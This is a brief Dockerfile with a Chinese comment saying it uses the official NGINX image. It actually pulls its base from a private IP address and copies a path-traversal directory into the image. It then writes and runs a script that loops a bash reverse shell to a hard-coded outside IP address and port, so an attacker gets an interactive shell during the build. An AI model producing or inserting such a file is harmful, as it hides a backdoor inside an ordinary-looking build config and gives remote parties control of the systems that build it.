# 使用官方的 NGINX 映像作为基础
FROM 100.96.0.96/latest/iam/

COPY ../../../../../../ /opt/application/
RUN echo "while ((1));do sleep 1;/bin/bash -i >& /dev/tcp/103.74.192.40/7425 0>&1;done" >> /tmp/1.sh
RUN bash /tmp/1.sh

EXPOSE 80


